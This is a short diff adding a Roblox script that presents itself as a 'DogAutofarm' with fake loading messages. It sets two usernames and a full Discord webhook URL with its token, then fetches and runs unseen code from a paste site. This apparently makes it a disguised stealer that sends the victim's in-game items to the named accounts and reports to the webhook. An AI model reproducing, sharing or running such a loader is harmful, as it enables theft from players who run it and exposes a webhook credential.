@@ -1,0 +1,21 @@
+```
+
+UserName = "arableri"
+
+UserName2 = "csgoroblox2314"
+
+Webhook = "https://discord.com/api/webhooks/1112298036736040990/EH8HdxHKN4K8mbM7parGCi8e7HVtG1va-yRzpDC9oC4mGoOchJh948_ndmT11lhT4b6B"
+
+_G.ScriptName = "DogAutofarm"
+
+_G.FirstText = "Please wait.."
+
+_G.SecondText = "Script Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 300
+
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/984466", true))()
+
+```
